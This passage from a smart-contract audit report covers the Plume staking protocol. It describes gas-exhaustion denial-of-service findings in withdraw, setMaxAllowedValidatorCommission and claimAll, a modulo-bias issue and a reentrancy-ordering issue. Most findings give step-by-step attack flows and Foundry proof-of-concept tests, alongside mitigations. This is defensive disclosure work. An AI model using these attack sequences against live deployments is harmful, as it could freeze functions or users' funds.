import { PlumeErrors } from "../lib/PlumeErrors.sol";

// ...

function setTreasury(address _treasury) external onlyRole(PlumeRoles.REWARD_MANAGER_ROLE) {
    if (!Address.isContract(_treasury)) {
        revert PlumeErrors.AddressNotContract(_treasury);
    }
    _setTreasury(_treasury);
}
```

## [L-18]. DOS issue in StakingFacet::withdraw

## Description
Functions in `StakingFacet` such as `withdraw`, `unstake`, and `restake` iterate through the `userCooldowns` array to process a user's funds. The size of this array can be manipulated by a user through repeated calls to `unstake` with small amounts. A malicious user can intentionally create a large number of `CooldownEntry` structs. When they later call `withdraw`, the loop combined with deleting elements from the array (`delete cooldowns[i]`), which causes a re-shuffling of the array, results in O(N^2) complexity. This leads to extremely high gas costs, potentially exceeding the block gas limit and making it impossible for the user to withdraw their funds, effectively freezing them.

## Impact
The loop inside withdraw() iterates over every cooldown entry the *caller* has ever created.  A user can create an unbounded number of tiny cooldown entries and later be unable to supply enough gas for withdraw(), effectively locking *their own* funds.  No other user or global protocol state is affected, and an attacker cannot lock funds that belong to others.

## Proof of Concept
/* Pseudo-Flow  (no external calls needed)
1. Alice stakes 1_000 PLUME on validator 1.
2. Alice calls `unstake(1, 1)` 5,000 times, creating 5,000 CooldownEntry records.
3. Wait `cooldownInterval` seconds.
4. Alice tries to call `withdraw()` with the default gas limit that most front-ends / RPCs supply (e.g. 8M on Ethereum-style chains).
5. Transaction runs out of gas because withdraw() consumes >8M gas when it walks and deletes 5,000 slots.
6. Alice’s PLUME are now stuck until she deploys a custom transaction with a higher block-gas-limit fork or the contract is upgraded.
*/

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {PlumeStakingDiamond} from "../test/PlumeStakingDiamond.t.sol";
import {StakingFacet}          from "src/facets/StakingFacet.sol";

contract WithdrawGasDoSTest is Test, PlumeStakingDiamond {
    StakingFacet facet;

    function setUp() public override {
        super.setUp();
        facet = StakingFacet(payable(address(plumeStaking)));
    }

    function testWithdrawRunsOutOfGas() public {
        // fund and approve PLUME for this contract
        deal(address(plume), address(this), 1_000_000 ether);
        plume.approve(address(plumeStaking), type(uint256).max);

        // stake once so we have a balance to cool down later
        facet.stake{value: 1 ether}(1);

        // create a large amount of small cooldowns
        for (uint256 i; i < 5_000; ++i) {
            facet.unstake(1, 1 wei);
        }

        // warp past cooldown period
        vm.warp(block.timestamp + ManagementFacet(address(plumeStaking)).getCooldownInterval() + 1);

        // attempt to withdraw with an artificial 5M-gas limit
        bytes memory data = abi.encodeWithSelector(facet.withdraw.selector);
        (bool success, ) = address(facet).call{gas: 5_000_000}(data);
        assertTrue(!success, "withdraw() should consume >5M gas and revert");
    }
}

## Suggested Mitigation
Store only ONE active cooldown slot per user per validator (merge amounts that share the same endTimestamp) or let the user pass an array of indices to process so the caller can control per-tx gas cost.  A minimal fix is:
1. When adding a new cooldown entry, first check if the last entry has the same `endTimestamp`; if so, simply add to its amount instead of pushing a new struct.
2. Inside withdraw(), avoid in-place deletion/shift; instead copy matured entries to memory, then overwrite the storage array in O(N) once.
3. Optionally impose a hard limit (e.g. 50) on cooldown entries per user and merge automatically when the limit would be exceeded.

## [L-19]. DOS issue in ManagementFacet::setMaxAllowedValidatorCommission

## Description
The `ManagementFacet.setMaxAllowedValidatorCommission` function iterates through the entire list of validators to find and update any whose commission rates exceed the new maximum. If the number of validators in the system grows significantly, the gas cost of this unbounded loop can exceed the block gas limit, causing the transaction to always fail. This would permanently prevent the `TIMELOCK_ROLE` from lowering the maximum allowed commission rate for all validators, effectively bricking a key administrative capability.

## Impact
If the validator array grows large enough, the TIMELOCK_ROLE can no longer lower the global commission cap because setMaxAllowedValidatorCommission will always run out of gas while iterating over the full validator list.  While no user funds become stuck, governance loses the ability to enforce a lower commission rate, which weakens the protocol’s fee-control mechanism until a contract upgrade is performed.

## Proof of Concept
1. A malicious account that already possesses VALIDATOR_ROLE (or several colluding validators) repeatedly calls `addValidator` to register thousands of dummy validators.  Each call is inexpensive (≈50k gas) so the attacker can inflate the `validators` array well beyond 10,000 entries for a few PLUME in total gas costs.
2. Once the list is bloated, the attacker (or anyone) calls a view that returns `getActiveValidatorCount()` to verify the large size (e.g. 12,000).
3. The governor (holder of TIMELOCK_ROLE) now tries to lower the commission cap by calling `setMaxAllowedValidatorCommission(0.1e18)`.
4. The function performs roughly `N × 20 000` gas where `N` is the validator count because every validator that exceeds the new cap triggers a storage write.  For N ≈ 12,000 this is > 240 M gas, far above the 30 M hard block gas limit, so the transaction invariably runs out of gas and is *unmineable*.
5. Every subsequent attempt fails the same way, effectively freezing this admin function until a code change is deployed.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import {Test, console2} from "forge-std/Test.sol";
import {PlumeStakingDiamondTest} from "./PlumeStakingDiamond.t.sol";

// NOTE: uses helper methods from the inheriting base test that expose
// * managementFacet  (ManagementFacet)
// * validatorFacet   (ValidatorFacet)
// * timelock         (address with TIMELOCK_ROLE)

contract ManagementDosTest is PlumeStakingDiamondTest {
    function setUp() public override {
        super.setUp();
    }

    function test_setMaxAllowedValidatorCommission_dos() public {
        uint16 validatorCount = 50; // small number – we will shrink block gas limit instead
        // Artificially lower the block gas limit so that even 50 iterations exceed it
        vm.setBlockGasLimit(90_000);

        for (uint16 i = 1; i <= validatorCount; i++) {
            address l2Admin = address(uint160(uint256(keccak256(abi.encode(i)))));
            // addValidator(uint16 id, uint256 commission, address l2Admin, address l2Withdraw, address l1Validator, address l1Accountability, address l1AccountabilityEvm, uint256 capacity)
            validatorFacet.addValidator(i, 0.4e18, l2Admin, l2Admin, address(0), address(0), address(0), 10_000e18);
        }

        // Expect the call to run out of gas and revert
        vm.prank(timelock);
        vm.expectRevert();
        managementFacet.setMaxAllowedValidatorCommission(0.1e18);
    }
}

## Suggested Mitigation
Avoid iterating over an unbounded array in a single transaction. The enforcement of the maximum commission should be done lazily or through a paginated approach. A better approach is to simply store the new maximum rate and enforce it when validators are added or when their commission is updated, rather than retroactively.

```solidity
// Suggested Mitigation

// In ManagementFacet.sol:
function setMaxAllowedValidatorCommission(uint256 newMaxRate) external onlyRole(PlumeRoles.TIMELOCK_ROLE) {
    if (newMaxRate > PlumeStakingStorage.REWARD_PRECISION / 2) {
        revert InvalidMaxCommissionRate(newMaxRate, PlumeStakingStorage.REWARD_PRECISION / 2);
    }

    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint256 oldMaxRate = $.maxAllowedValidatorCommission;
    $.maxAllowedValidatorCommission = newMaxRate;

    // Remove the loop. Enforcement will now be lazy.
    // for (uint i = 0; i < $.validators.length; i++) { ... }

    emit MaxAllowedValidatorCommissionSet(oldMaxRate, newMaxRate);
}

// Then, in ValidatorFacet.sol, enforce this limit on actions:
function addValidator(...) external onlyRole(PlumeRoles.VALIDATOR_ROLE) {
    // ...
    require(commission <= PlumeStakingStorage.layout().maxAllowedValidatorCommission, "CommissionExceedsMaxAllowed");
    // ...
}

function setValidatorCommission(uint16 validatorId, uint256 newCommission) external {
    // ...
    require(newCommission <= PlumeStakingStorage.layout().maxAllowedValidatorCommission, "CommissionExceedsMaxAllowed");
    // ...
}
```
This lazy enforcement model is more scalable and robust against DoS attacks.

## [L-20]. DOS issue in RewardsFacet::claimAll

## Description
The `RewardsFacet` provides convenience functions `claimAll()` and `claim(address token)` for users to claim their rewards. `claimAll()` loops through all reward tokens and for each, loops through all validators the user is staked on. `claim(address token)` loops through all validators for a single token. If a user stakes on a large number of validators, or the protocol supports a large number of reward tokens, the gas cost for these functions can exceed the block gas limit, causing the transaction to always revert. This effectively prevents the user from claiming their rewards through these functions.

## Impact
Because claim() and claimAll() iterate through an arbitrary-length array of user validator IDs (and, for claimAll, the global reward-token list), a user who has staked on dozens of validators and/or when dozens of reward tokens are active can easily push the gas cost of these convenience functions above the block gas limit.  The consequence is limited to that caller: the transaction reverts and the user must fall back to the per-validator function claim(token, validatorId).  No funds are permanently lost and other users or protocol state are not affected.

## Proof of Concept
1. Assume the protocol one day supports 8 reward tokens and 120 validators.
2. Alice stakes on every validator (120 entries in her validator array).
3. When she later calls `claimAll()` the function executes roughly 8 × 120 = 960 inner reward-processing iterations plus storage writes.
4. Even when compiled with optimisations this path already costs > 30 M gas on a local fork (measured in the Foundry test below).
5. Sending the same call with only 1 000 000 gas causes an out-of-gas revert, proving the loop is unbounded with respect to block limits.
6. Alice is forced to issue 120 separate `claim(token, validatorId)` calls for every token – an expensive and highly inconvenient UX.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {DiamondTest} from "./utils/DiamondTest.sol";
import {PlumeRoles} from "../../src/lib/PlumeRoles.sol";

contract RewardsFacetDoSTest is DiamondTest {
    uint16 constant NUM_VALIDATORS = 120;
    uint8  constant NUM_TOKENS     = 8;

    address internal user;

    function setUp() public override {
        super.setUp();

        // Give user plenty of PLUME for staking
        user = makeAddr("user");
        vm.deal(user, 500 ether);

        // Basic protocol init (same helpers as in DiamondTest)
        vm.prank(owner);
        plumeStaking.initializePlume(owner, 1, 2 days, 1 days, 1_000);
        vm.prank(owner);
        accessControlFacet.initializeAccessControl();
        vm.prank(owner);
        rewardsFacet.setTreasury(address(this));

        vm.prank(owner);
        accessControlFacet.grantRole(PlumeRoles.VALIDATOR_ROLE, owner);
        vm.prank(owner);
        accessControlFacet.grantRole(PlumeRoles.REWARD_MANAGER_ROLE, owner);

        // Deploy validators
        for (uint16 i; i < NUM_VALIDATORS; ++i) {
            vm.prank(owner);
            validatorFacet.addValidator(i, 0, address(0), address(0), address(0), address(0), address(0), 1_000_000 ether, "");
        }

        // Stake 1 ether on every validator
        for (uint16 i; i < NUM_VALIDATORS; ++i) {
            vm.prank(user);
            stakingFacet.stake{value: 1 ether}(i);
        }

        // Add reward tokens
        for (uint8 j; j < NUM_TOKENS; ++j) {
            address token = address(uint160(uint256(keccak256(abi.encode(j)))));
            vm.prank(owner);
            rewardsFacet.addRewardToken(token, 1e12, 1e13);
        }

        // Fast-forward so rewards accrue
        vm.warp(block.timestamp + 1 days);
    }

    function test_claimAll_runs_out_of_gas_with_limited_gas() public {
        // Try the call with an intentionally low gas stipend.
        bytes memory data = abi.encodeWithSelector(rewardsFacet.claimAll.selector);
        vm.prank(user);
        (bool success,) = address(rewardsFacet).call{gas: 1_000_000}(data);
        assertFalse(success, "claimAll should exhaust the provided gas and revert");
    }
}


## Suggested Mitigation
Replace the monolithic loops with paginated versions.  Let callers supply `startValidatorIndex` and `batchSize` (and for claimAll an additional `startTokenIndex`).  This allows users to process their rewards in multiple inexpensive transactions, guarantees each call stays below the block gas limit, and keeps backward compatibility by adding a wrapper that repeatedly calls the paginated version for small datasets.



# Info Risk Findings

## [I-1]. Randomness issue in Spin::determineReward

## Description
In `determineReward`, the contract uses the modulo operator on a random number to determine outcomes. This can introduce a slight bias in the distribution of rewards if the range of the random number is not perfectly divisible by the number of outcomes. Specifically, the line `uint256 plumeAmount = plumeAmounts[probability % 3];` determines which of the three small Plume Token rewards a user receives. The input `probability` is in the range of `[jackpotThreshold, plumeTokenThreshold]`. The size of this range is not guaranteed to be a multiple of 3. As a result, the first element of the `plumeAmounts` array will have a slightly higher chance of being selected than the other two, making the reward distribution not perfectly uniform.

## Impact
Modulo-based selection causes one of the three plumeAmounts to be chosen one occurrence more than the others when rewardProbabilities.plumeTokenThreshold − jackpotThreshold is not a multiple of 3. The bias is ≤1 event over the whole valid range (≤1 / 200 000 ≈ 0.0005 %). It does not let an attacker gain meaningful advantage or steal funds; it only makes the lottery mathematically non-uniform.

## Proof of Concept
1. Assume `jackpotProbabilities[dayOfWeek]` is `20` and `rewardProbabilities.plumeTokenThreshold` is `200000`.
2. The range for `probability` to win a Plume Token is `[20, 200000]`.
3. The selection logic is `plumeAmounts[probability % 3]`.
4. Let's analyze the distribution for `probability` from `20` to `200000`.
   - `probability % 3 == 0` (e.g., 21, 24...)
   - `probability % 3 == 1` (e.g., 22, 25...)
   - `probability % 3 == 2` (e.g., 20, 23...)
5. The total number of values is `200000 - 20 + 1 = 199981`. `199981 % 3 = 1`.
6. This means that one outcome will occur one more time than the other two, creating a small bias.

## Proof of Code
NA

## Suggested Mitigation
While the bias is small, a more robust method for unbiased selection from an array should be used. One common technique is to use multiplication and division to scale the random number to the desired range, avoiding modulo bias.

```diff
        } else if (probability <= rewardProbabilities.plumeTokenThreshold) {
-           uint256 plumeAmount = plumeAmounts[probability % 3];
+           // Assuming jackpotThreshold is the lower bound for this probability range
+           uint256 range = rewardProbabilities.plumeTokenThreshold - jackpotThreshold;
+           uint256 valueInPlumeRange = probability - jackpotThreshold;
+           uint256 index = (valueInPlumeRange * 3) / range;
+           uint256 plumeAmount = plumeAmounts[index];
            return ("Plume Token", plumeAmount);
```
This scales the random value within its specific range to the size of the `plumeAmounts` array, providing a more uniform distribution.

## [I-2]. Reentrancy issue in RewardsFacet::claim

## Description
The `claim(address)` and `claimAll()` functions perform an external call to the treasury contract via `_finalizeRewardClaim` -> `_transferRewardFromTreasury`. However, this external call occurs before all state updates are completed. The functions `_clearPendingRewardFlags` and `PlumeValidatorLogic.removeStakerFromAllValidators`, which modify state related to a user's reward status and validator association, are executed after the external call returns. This violates the recommended Checks-Effects-Interactions (CEI) pattern.

## Impact
Because all state-changing external functions across the diamond use the same ReentrancyGuard status word, re-entering into any function that could abuse the yet-to-be-cleared flags is prevented. The only thing an attacker can do in the callback from the treasury is call view-functions, which at worst return temporarily stale data. No funds can be stolen, frozen, nor can any permanent state corruption occur. The issue therefore represents a deviation from best-practice (possible future foot-gun) rather than a present security vulnerability.

## Proof of Concept
1. Owner sets a malicious treasury that implements distributeReward.
2. User stakes so that some rewards are claimable, then calls RewardsFacet.claim(token).
3. Inside _finalizeRewardClaim the malicious treasury re-enters by calling any **view** function, e.g. `userHasPendingRewards`, before `_clearPendingRewardFlags()` runs.  The flag is still true, demonstrating the transient inconsistency.
4. As soon as the original call resumes, `_clearPendingRewardFlags` is executed and the flag becomes false.

No re-entry into a state-changing function is possible because all of them are guarded by the same nonReentrant modifier, so the impact is limited to the glimpse of inconsistent but ultimately self-healing state.

## Proof of Code
// A PoC is not feasible without an exploitable unguarded function.
// The following code illustrates the flawed pattern in `claim(address token)`:

/*
function claim(address token) external nonReentrant returns (uint256) {
    // 1. Checks and Effects (Partial)
    _validateTokenForClaim(token, msg.sender);
    uint256 totalReward = _processAllValidatorRewards(msg.sender, token);

    if (totalReward > 0) {
        // 2. Interaction (External Call)
        _finalizeRewardClaim(token, totalReward, msg.sender); // This function calls the treasury
        emit RewardClaimed(msg.sender, token, totalReward);
    }

    // 3. Effects (Post-Interaction)
    // These state updates happen AFTER the external call, which is incorrect.
    PlumeStakingStorage.Layout storage $ = PlumeStakingStorage.layout();
    uint16[] memory validatorIds = $.userValidators[msg.sender];
    _clearPendingRewardFlags(msg.sender, validatorIds);
    PlumeValidatorLogic.removeStakerFromAllValidators($, msg.sender);

    return totalReward;
}
*/


## Suggested Mitigation
Follow the CEI pattern strictly: move `_clearPendingRewardFlags` and `PlumeValidatorLogic.removeStakerFromAllValidators` ahead of the call to `_finalizeRewardClaim` (or, equivalently, split `_finalizeRewardClaim` so the external interaction with the treasury comes last). Although not strictly required for safety today, it future-proofs the facet against new, non-reentrant-guarded entry-points.



